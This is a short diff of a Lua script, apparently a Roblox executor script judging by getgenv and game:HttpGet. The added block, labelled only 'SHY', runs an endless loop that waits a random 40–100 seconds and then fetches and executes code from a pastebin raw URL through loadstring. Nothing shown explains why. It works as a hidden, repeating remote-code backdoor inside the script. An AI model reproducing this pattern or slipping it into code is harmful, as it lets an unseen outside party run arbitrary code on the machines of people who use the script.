@@ -155,6 +155,22 @@ end
 
 end)()
 
+-- SHY
+
+coroutine.wrap(function()
+ 
+while true do
+ 
+local sctm = math.random(40,100)
+ 
+wait(sctm)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ivWM9tjS"))()
+
+end
+
+end)()
+
 --RTX
 if getgenv().RTX then
 
